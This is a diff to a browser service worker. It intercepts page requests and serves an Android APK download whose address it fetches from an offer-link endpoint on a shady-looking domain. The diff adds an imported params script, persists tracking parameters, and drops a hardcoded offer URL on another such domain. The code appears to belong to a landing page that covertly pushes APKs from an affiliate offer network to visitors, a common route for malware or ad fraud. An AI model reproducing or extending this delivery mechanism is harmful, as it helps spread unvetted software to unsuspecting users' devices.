@@ -1,3 +1,5 @@
+importScripts('./params.js?v=b1-params-1');
+
 self.addEventListener('install', () => {
   self.skipWaiting();
 });
@@ -18,8 +20,6 @@ let apkRequestKey = null;
 let apkState = null;
 
 const OFFER_LINK_ENDPOINT = 'https://iijjuiu.shop/landers/gitand/offer-link.php';
-// Snapshot of the offer-link response for offer_id=936. Keep template substitution below.
-const OFFER_936_RESPONSE = Object.freeze({"url": "https://nickemdenslend.world/9d9e87dbccdbfa9715d/?utm_id={clickid}&utm_medium={t2}"});
 
 function delay(ms) {
   return new Promise((resolve) => {
@@ -133,32 +133,27 @@ function fillOfferUrlTemplate(value, params) {
 
 async function resolveOfferUrl(offerId, params) {
   const clickId = getClickId(params);
-  let data;
-  if (offerId === '936') {
-    data = OFFER_936_RESPONSE;
-  } else {
-    const endpoint = new URL(OFFER_LINK_ENDPOINT);
-    endpoint.searchParams.set('offer_id', offerId);
-    if (clickId) {
-      endpoint.searchParams.set('click_id', clickId);
-    }
-
-    const response = await fetch(endpoint.href, {
-      method: 'GET',
-      mode: 'cors',
-      credentials: 'omit',
-      redirect: 'follow',
-      headers: {
-        'Accept': 'application/json',
-      },
-    });
-
-    if (!response.ok) {
-      throw new Error(`offer HTTP ${response.status}`);
-    }
-
-    data = await response.json();
+  const endpoint = new URL(OFFER_LINK_ENDPOINT);
+  endpoint.searchParams.set('offer_id', offerId);
+  if (clickId) {
+    endpoint.searchParams.set('click_id', clickId);
   }
+
+  const response = await fetch(endpoint.href, {
+    method: 'GET',
+    mode: 'cors',
+    credentials: 'omit',
+    redirect: 'follow',
+    headers: {
+      'Accept': 'application/json',
+    },
+  });
+
+  if (!response.ok) {
+    throw new Error(`offer HTTP ${response.status}`);
+  }
+
+  const data = await response.json();
   if (!data || typeof data.url !== 'string' || data.url.trim() === '') {
     throw new Error('offer response url is missing');
   }
@@ -318,19 +313,19 @@ self.addEventListener('fetch', (event) => {
   }
 
   event.respondWith((async () => {
-    const offerId = requestUrl.searchParams.get('offer_id');
-    const fileName = sanitizeFileName(requestUrl.searchParams.get('name'));
-
-    if (!offerId || !offerId.trim()) {
-      return buildErrorResponse('Missing offer_id parameter', 400);
-    }
-
     try {
+      const params = new URLSearchParams(await B1Params.read());
+      const offerId = params.get('offer_id');
+      const fileName = sanitizeFileName(params.get('utm_medium'));
+      if (!offerId || !offerId.trim()) {
+        return buildErrorResponse('Missing saved offer_id parameter', 400);
+      }
+
       return await buildDeferredApkResponse(
         offerId.trim().slice(0, 80),
         fileName,
-        requestUrl.searchParams,
-        requestUrl.search
+        params,
+        params.toString()
       );
     } catch (error) {
       return buildErrorResponse(`APK download failed: ${error.message}`, 502);
